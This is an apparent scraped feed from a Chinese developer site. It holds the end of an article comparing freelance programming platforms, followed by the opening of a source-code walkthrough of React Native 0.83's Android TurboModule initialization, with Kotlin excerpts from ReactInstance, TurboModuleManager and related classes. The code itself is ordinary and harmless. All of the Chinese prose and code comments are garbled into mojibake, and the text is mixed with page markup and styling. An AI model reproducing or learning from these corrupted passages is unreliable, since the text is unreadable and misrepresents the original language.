<p>CodementorX å¯¹å¼€å‘è€…ç­›é€‰ç›¸å¯¹ä¸¥æ ¼ï¼Œå¹³å°ä¸Šçš„ç¨‹åºå‘˜æ¥å•é¡¹ç›®é€šå¸¸å¯¹æŠ€æœ¯æ·±åº¦å’Œç»éªŒæœ‰æ˜ç¡®è¦æ±‚ã€‚é¡¹ç›®æ•°é‡ä¸å¤šï¼Œä½†æ•´ä½“ä¸“ä¸šæ€§å’Œå•ä»·åé«˜ï¼Œæ›´çœ‹é‡æŠ€æœ¯æ˜¯å¦åŒ¹é…ï¼Œè€Œä¸æ˜¯è°æŠ¥ä»·ä½ã€‚</p>
<p>ä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œæ²Ÿé€šæ•ˆç‡é€šå¸¸è¾ƒé«˜ï¼ŒèŠ‚å¥åæ…¢ä½†è´¨é‡ç›¸å¯¹ç¨³å®šã€‚é€‚åˆåœ¨æŸä¸€æŠ€æœ¯æ–¹å‘æŒç»­ç§¯ç´¯ã€å¸Œæœ›å‡å°‘æ— æ•ˆæ²Ÿé€šçš„ç¨‹åºå‘˜ã€‚</p>
<h2 data-id="heading-9">Topcoder</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06f4667a6ec440669cde096ced4aca75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=3L1%2FWU3%2F7BcsVoS8d%2FzWwWykzm8%3D" alt="" loading="lazy"/></p>
<p>Topcoder çš„æ¨¡å¼å’Œå¸¸è§„ç¨‹åºå‘˜æ¥å•å¹¶ä¸å®Œå…¨ä¸€æ ·ï¼Œå¾ˆå¤šéœ€æ±‚é€šè¿‡ç«èµ›æˆ–æŠ€æœ¯æŒ‘æˆ˜å®Œæˆï¼Œæ›´å¼ºè°ƒæŠ€æœ¯èƒ½åŠ›æœ¬èº«ã€‚</p>
<p>è¿™ç§æ–¹å¼ä¸é€‚åˆè¿½æ±‚ç¨³å®šç°é‡‘æµçš„äººï¼Œä½†åœ¨ç®—æ³•ã€æ•°æ®ã€æ€§èƒ½ä¼˜åŒ–ç­‰æ–¹å‘ï¼Œé¡¹ç›®æ ‡å‡†æ¸…æ™°ï¼Œå¯¹èƒ½åŠ›æå‡å’Œå±¥å†ç§¯ç´¯æœ‰ä¸€å®šå¸®åŠ©ï¼Œæ›´é€‚åˆä½œä¸ºè¡¥å……é€‰æ‹©ã€‚</p>
<h2 data-id="heading-10">å†™åœ¨æœ€å</h2>
<p>è¯´åˆ°åº•ï¼Œç¨‹åºå‘˜æ¥å•å¹¶ä¸å­˜åœ¨ä¸‡èƒ½å¹³å°ã€‚çœŸæ­£å†³å®šä½“éªŒå¥½åçš„ï¼Œæ˜¯<strong>ä½ çš„æŠ€æœ¯é˜¶æ®µã€ç›®æ ‡é¢„æœŸï¼Œä»¥åŠå¹³å°å®šä½æ˜¯å¦åŒ¹é…</strong>ã€‚</p>
<p>é€‰å¯¹å¹³å°ï¼Œæ¥å•æ˜¯åŠ é€Ÿå™¨ï¼›é€‰é”™å¹³å°ï¼Œåªä¼šæ¶ˆè€—æ—¶é—´å’Œç²¾åŠ›ã€‚å¸Œæœ›è¿™ä»½åŸºäºå®é™…ä½¿ç”¨ä½“éªŒçš„æ•´ç†ï¼Œèƒ½å¸®ä½ åœ¨ 2026 å¹´åšç¨‹åºå‘˜æ¥å•æ—¶ï¼Œå°‘èµ°å¼¯è·¯ï¼Œæ›´ç¨³åœ°èµ°ä¸‹å»ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7561c1d12be245da9dfc4faa92274133~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070764&amp;x-signature=ItfdDaLKDgqXm5W5k2RTjM%2BN6%2Fk%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æ]]></title>    <link>https://juejin.cn/post/7595178023256211475</link>    <guid>https://juejin.cn/post/7595178023256211475</guid>    <pubDate>2026-01-15T08:35:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256211475" data-draft-id="7594087108593221695" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æ"/> <meta itemprop="keywords" content="React Native,Android,æºç é˜…è¯»"/> <meta itemprop="datePublished" content="2026-01-15T08:35:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¼–ç¨‹ä¹‹è·¯ä»0åˆ°1"/> <meta itemprop="url" content="https://juejin.cn/user/4125023359744296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4125023359744296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¼–ç¨‹ä¹‹è·¯ä»0åˆ°1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:35:01.000Z" title="Thu Jan 15 2026 08:35:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»27åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æ</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<blockquote>
<p>æ³¨æ„ï¼Œæœ¬æ–‡æ˜¯åŸºäº<a href="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact-native%2Ftree%2Fv0.83.0" title="https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact-native%2Ftree%2Fv0.83.0" target="_blank">React Native</a>Â 0.83ç‰ˆæœ¬æºç è¿›è¡Œåˆ†æã€‚</p>
</blockquote>
<p>åœ¨<a href="https://juejin.cn/post/7594627998839406634" target="_blank" title="https://juejin.cn/post/7594627998839406634">ã€ŠReact Nativeæ–°æ¶æ„ä¹‹Androidç«¯åˆå§‹åŒ–æºç åˆ†æã€‹</a>ä¸€æ–‡å·²ç»å‰–æäº†å¯åŠ¨æµç¨‹ï¼Œä½†ä¸Šæ¬¡ç•¥è¿‡äº†TurboModuleç³»ç»Ÿï¼Œç°åœ¨å°±è¯¦ç»†åˆ†æä¸€ä¸‹TurboModuleç³»ç»Ÿã€‚</p>
<h3 data-id="heading-2">TurboModule åˆå§‹åŒ–</h3>
<p>æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹æºç <code>react-native/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/runtime/ReactInstance.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactInstance</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: BridgelessReactContext,
    delegate: ReactHostDelegate,
    componentFactory: ComponentFactory,
    devSupportManager: DevSupportManager,
    exceptionHandler: QueueThreadExceptionHandler,
    useDevSupport: <span class="hljs-built_in">Boolean</span>,
    reactHostInspectorTarget: ReactHostInspectorTarget?,
) {
  <span class="hljs-meta">@Suppress(<span class="hljs-string">"NoHungarianNotation"</span>)</span> <span class="hljs-meta">@DoNotStrip</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mHybridData: HybridData

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> turboModuleManager: TurboModuleManager
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> javaTimerManager: JavaTimerManager
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> viewManagerResolver: BridgelessViewManagerResolver

  <span class="hljs-keyword">val</span> reactQueueConfiguration: ReactQueueConfiguration
  <span class="hljs-keyword">val</span> fabricUIManager: FabricUIManager
  <span class="hljs-keyword">val</span> javaScriptContextHolder: JavaScriptContextHolder

  <span class="hljs-keyword">init</span> {
    <span class="hljs-comment">// çœç•¥â€¦â€¦</span>

    <span class="hljs-comment">// è®¾ç½® TurboModules</span>
    Systrace.beginSection(Systrace.TRACE_TAG_REACT, <span class="hljs-string">"ReactInstance.initialize#initTurboModules"</span>)

    <span class="hljs-keyword">val</span> reactPackages: MutableList&lt;ReactPackage&gt; = ArrayList&lt;ReactPackage&gt;()
    reactPackages.add(
        CoreReactPackage(context.devSupportManager, context.defaultHardwareBackBtnHandler)
    )
    <span class="hljs-keyword">if</span> (useDevSupport) {
      reactPackages.add(DebugCorePackage())
    }
    reactPackages.addAll(delegate.reactPackages)
    <span class="hljs-comment">// åˆ›å»º TurboModuleManagerDelegate</span>
    <span class="hljs-keyword">val</span> turboModuleManagerDelegate =
        delegate.turboModuleManagerDelegateBuilder
            .setPackages(reactPackages)
            .setReactApplicationContext(context)
            .build()

    <span class="hljs-keyword">val</span> unbufferedRuntimeExecutor = getUnbufferedRuntimeExecutor()
    <span class="hljs-comment">// åˆ›å»º TurboModuleManager</span>
    turboModuleManager =
        TurboModuleManager( <span class="hljs-comment">// ä½¿ç”¨ unbuffered RuntimeExecutor æ¥å®‰è£…ç»‘å®š</span>
            unbufferedRuntimeExecutor,
            turboModuleManagerDelegate,
            getJSCallInvokerHolder(),
            getNativeMethodCallInvokerHolder(),
        )
    Systrace.endSection(Systrace.TRACE_TAG_REACT)
    <span class="hljs-comment">// çœç•¥â€¦â€¦</span>
  }
  <span class="hljs-comment">// çœç•¥â€¦â€¦</span>
}
</code></pre>
<p>ä»¥ä¸Šä»£ç ï¼Œåœ¨<code>ReactInstance</code>å¯¹è±¡æ„é€ æ—¶ç«‹å³åœ¨ <code>init {}</code> ä¸­åˆ›å»º <code>TurboModuleManager</code>ã€‚ä½†éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œè¿™é‡Œæ³¨å…¥çš„<code>CoreReactPackage</code>å¹³å°ç›¸å…³çš„ä¸€äº›å†…éƒ¨æ¨¡å—ï¼Œè€Œ<code>reactPackages.addAll(delegate.reactPackages)</code>æ·»åŠ çš„åˆ™æ˜¯åœ¨<code>MainApplication</code>ä¸­æ³¨å†Œçš„æœ¬åœ°Turbo Moduleå®ç°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> : <span class="hljs-type">Application</span>(), ReactApplication {

  <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> reactHost: ReactHost <span class="hljs-keyword">by</span>
      lazy(LazyThreadSafetyMode.NONE) {
        getDefaultReactHost(
            context = applicationContext,
            packageList =
                PackageList(<span class="hljs-keyword">this</span>).packages.apply {
                  <span class="hljs-comment">// ä¾‹å¦‚ï¼Œç›®å‰è¿˜æ— æ³•è‡ªåŠ¨é“¾æ¥çš„è½¯ä»¶åŒ…å¯ä»¥æ‰‹åŠ¨æ·»åŠ åˆ°è¿™é‡Œ:</span>
                  <span class="hljs-comment">// add(MyReactNativePackage())</span>
                },
        )
      }
  <span class="hljs-comment">// çœç•¥â€¦â€¦</span>
}
</code></pre>
<p>è¿™é‡Œéœ€è¦é‡ç‚¹ç•™æ„çš„æ˜¯<code>PackageList(this).packages</code>è¿™è¡Œä»£ç ï¼Œ<code>PackageList</code>æ˜¯å·¥å…·è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ï¼Œä¸»è¦ä¾é <code>Gradle</code> æ’ä»¶æœºåˆ¶æ¥æ”¶é›†å’Œé“¾æ¥ä¸‰æ–¹TurboModuleæ¨¡å—ï¼Œå…¶ä¸­ä¸»è¦æ˜¯Gradleè„šæœ¬ä»£ç ï¼Œä¸ºäº†ä¸ä¸­æ–­ä»£ç åˆ†æçš„æ€è·¯ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†çš„è¯¦ç»†åˆ†ææˆ‘æ”¾åˆ°æœ¬æ–‡çš„æœ€åã€‚</p>
<h4 data-id="heading-3"><code>TurboModuleManager</code>çš„åˆå§‹åŒ–</h4>
<p>æºç <code>react-native/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/internal/turbomodule/core/TurboModuleManager.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * è¿™æ˜¯ TurboModules çš„ä¸»ç±»å’Œå…¥å£ç‚¹ã€‚æ³¨æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªæ··åˆç±»ï¼Œ
 * å®ƒæœ‰ä¸€ä¸ª C++ å¯¹åº”ç±»ã€‚æ­¤ç±»å®‰è£… JSI ç»‘å®šã€‚å®ƒè¿˜å®ç°äº†è·å– Java æ¨¡å—çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”± C++ å¯¹åº”ç±»è°ƒç”¨ã€‚
 */</span>
<span class="hljs-meta">@OptIn(FrameworkAPI::class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TurboModuleManager</span>(
    runtimeExecutor: RuntimeExecutor,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> delegate: TurboModuleManagerDelegate?,
    jsCallInvokerHolder: CallInvokerHolder,
    nativeMethodCallInvokerHolder: NativeMethodCallInvokerHolder,
) : TurboModuleRegistry {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> eagerInitModuleNames: List&lt;String&gt;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> turboModuleProvider: ModuleProvider
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> legacyModuleProvider: ModuleProvider

    <span class="hljs-comment">// æ¨¡å—æ¸…ç†é”ï¼ˆé˜²æ­¢åœ¨æ¸…ç†æ—¶åˆ›å»ºæ–°æ¨¡å—ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> moduleCleanupLock = Object()

    <span class="hljs-meta">@GuardedBy(<span class="hljs-string">"moduleCleanupLock"</span>)</span> 
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> moduleCleanupStarted = <span class="hljs-literal">false</span>

    <span class="hljs-comment">// æ¨¡å—ç¼“å­˜ï¼šmoduleName -&gt; ModuleHolder</span>
    <span class="hljs-meta">@GuardedBy(<span class="hljs-string">"moduleCleanupLock"</span>)</span> 
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> moduleHolders = mutableMapOf&lt;String, ModuleHolder&gt;()

    <span class="hljs-comment">// 1. åˆ›å»º C++ HybridDataï¼ˆJNI æ¡¥æ¥ï¼‰</span>
    <span class="hljs-meta">@DoNotStrip</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mHybridData: HybridData = initHybrid(
        runtimeExecutor,
        jsCallInvokerHolder <span class="hljs-keyword">as</span> CallInvokerHolderImpl,
        nativeMethodCallInvokerHolder <span class="hljs-keyword">as</span> NativeMethodCallInvokerHolderImpl,
        delegate,
    )

    <span class="hljs-keyword">init</span> {
        <span class="hljs-comment">// 2. å®‰è£… JSI Bindings åˆ° JavaScript Runtime</span>
        installJSIBindings(shouldEnableLegacyModuleInterop())

        <span class="hljs-comment">// 3. è·å–éœ€è¦é¢„åŠ è½½çš„æ¨¡å—åˆ—è¡¨</span>
        eagerInitModuleNames = delegate?.getEagerInitModuleNames() ?: emptyList()

        <span class="hljs-comment">// 4. åˆ›å»º TurboModule æä¾›è€…</span>
        <span class="hljs-keyword">val</span> nullProvider = ModuleProvider { _: String -&gt; <span class="hljs-literal">null</span> }

        turboModuleProvider = <span class="hljs-keyword">if</span> (delegate == <span class="hljs-literal">null</span>) nullProvider
        <span class="hljs-keyword">else</span> ModuleProvider { moduleName: String -&gt; 
            delegate.getModule(moduleName) <span class="hljs-keyword">as</span> NativeModule?
        }

        <span class="hljs-comment">// 5. åˆ›å»º Legacy Module æä¾›è€…ï¼ˆå…¼å®¹æ—§æ¶æ„ï¼‰</span>
        <span class="hljs-comment">// çœç•¥......</span>
    }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"TurboModuleManager"</span>

        <span class="hljs-keyword">init</span> {
            <span class="hljs-comment">// åŠ è½½ C++ åº“</span>
            SoLoader.loadLibrary(<span class="hljs-string">"turbomodulejsijni"</span>)
        }
    }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>TurboModuleManager</code>å®ç°äº†<code>TurboModuleRegistry</code>æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹è¯¥æ¥å£äº†è§£å¤§è‡´çš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * ç”¨äºåˆ›å»ºå’Œæ£€ç´¢ NativeModule çš„æ¥å£ã€‚
 * 
 * ä¸ºä»€ä¹ˆè¿™ä¸ªæ¥å£è¦ä»¥ "Turbo" ä½œä¸ºå‰ç¼€ï¼Œå³ä½¿å®ƒåŒæ—¶æ”¯æŒ Legacy NativeModule å’Œ TurboModuleï¼Ÿ
 * å› ä¸ºå·²ç»å­˜åœ¨ä¸€ä¸ª NativeModuleRegistryï¼ˆæ—§æ¶æ„çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚
 * ä¸€æ—¦åˆ é™¤äº†é‚£ä¸ªç±»ï¼Œæˆ‘ä»¬åº”è¯¥ç›¸åº”åœ°é‡å‘½åæ­¤æ¥å£ã€‚
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TurboModuleRegistry</span> {
    <span class="hljs-comment">/**
     * è¿”å›åä¸º `moduleName` çš„ NativeModule å®ä¾‹ã€‚
     * å¦‚æœ `moduleName` å¯¹åº”çš„ TurboModule å°šæœªå®ä¾‹åŒ–ï¼Œåˆ™å®ä¾‹åŒ–å®ƒã€‚
     * å¦‚æœæ²¡æœ‰æ³¨å†Œåä¸º `moduleName` çš„ TurboModuleï¼Œåˆ™è¿”å› nullã€‚
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getModule</span><span class="hljs-params">(moduleName: <span class="hljs-type">String</span>)</span></span>: NativeModule?

    <span class="hljs-comment">/** è·å–æ‰€æœ‰å·²å®ä¾‹åŒ–çš„ NativeModuleã€‚*/</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> modules: Collection&lt;NativeModule&gt;

    <span class="hljs-comment">/** æ£€æŸ¥åä¸º `moduleName` çš„ NativeModule æ˜¯å¦å·²è¢«å®ä¾‹åŒ–ã€‚*/</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hasModule</span><span class="hljs-params">(moduleName: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Boolean</span>

    <span class="hljs-comment">/**
     * è¿”å›æ‰€æœ‰åº”è¯¥è¢«é¢„å…ˆåˆå§‹åŒ–çš„ NativeModule çš„åç§°åˆ—è¡¨ã€‚
     * é€šè¿‡å¯¹æ¯ä¸ªåç§°è°ƒç”¨ getModuleï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é¢„å…ˆåˆå§‹åŒ–è¿™äº› NativeModuleã€‚
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> eagerInitModuleNames: List&lt;String&gt;

    <span class="hljs-comment">/**
     * åœ¨ ReactHost å…³é—­è¿‡ç¨‹ä¸­è°ƒç”¨ã€‚
     * æ­¤æ–¹æ³•åœ¨ React Native åœæ­¢ä¹‹å‰è¢«è°ƒç”¨ã€‚
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invalidate</span><span class="hljs-params">()</span></span>
}
</code></pre>
<p>æ¥ä¸‹æ¥ä»”ç»†åˆ†æ<code>TurboModuleManager</code>çš„åˆå§‹åŒ–ã€‚<code>initHybrid</code>å’Œ<code>installJSIBindings</code>éƒ½æ˜¯Nativeæ–¹æ³•ï¼Œæˆ‘ä»¬ç¨ååˆ†æï¼Œå…ˆçœ‹çœ‹<code>delegate?.getEagerInitModuleNames()</code>è¿”å›çš„é¢„åŠ è½½æ¨¡å—æ˜¯ä»€ä¹ˆã€‚è¿™é‡Œçš„<code>delegate</code>æ˜¯å¤–éƒ¨ä¼ å…¥çš„<code>TurboModuleManagerDelegate</code>å®ä¾‹ï¼Œåœ¨<code>ReactInstance</code>åˆå§‹åŒ–ä¸­åˆ›å»ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> turboModuleManagerDelegate = delegate.turboModuleManagerDelegateBuilder
                                  .setPackages(reactPackages)
                                  .setReactApplicationContext(context)
                                  .build()
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“<code>ReactInstance</code>ä¸­çš„<code>delegate</code>æ˜¯<code>DefaultReactHostDelegate</code>å®ä¾‹ï¼Œè€Œ<code>DefaultReactHostDelegate</code>ä¸­çš„<code>turboModuleManagerDelegateBuilder</code>äº¦æ˜¯å¤–éƒ¨ä¼ å…¥ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// DefaultReactHost.kt</span>

<span class="hljs-keyword">val</span> defaultTmmDelegateBuilder = DefaultTurboModuleManagerDelegate.Builder()
cxxReactPackageProviders.forEach { defaultTmmDelegateBuilder.addCxxReactPackage(it) }
<span class="hljs-keyword">val</span> defaultReactHostDelegate =
    DefaultReactHostDelegate(
        jsMainModulePath = jsMainModulePath,
        jsBundleLoader = bundleLoader,
        reactPackages = packageList,
        jsRuntimeFactory = jsRuntimeFactory ?: HermesInstance(),
        bindingsInstaller = bindingsInstaller,
        turboModuleManagerDelegateBuilder = defaultTmmDelegateBuilder,
        exceptionHandler = exceptionHandler,
    )
</code></pre>
<p>å†çœ‹<code>react-native/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/defaults/DefaultTurboModuleManagerDelegate.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">(
        context: <span class="hljs-type">ReactApplicationContext</span>,
        packages: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ReactPackage</span>&gt;,
    )</span></span>: DefaultTurboModuleManagerDelegate =
        DefaultTurboModuleManagerDelegate(
            context,
            packages,
            cxxReactPackageProviders.flatMap { provider -&gt; provider(context) },
        )
</code></pre>
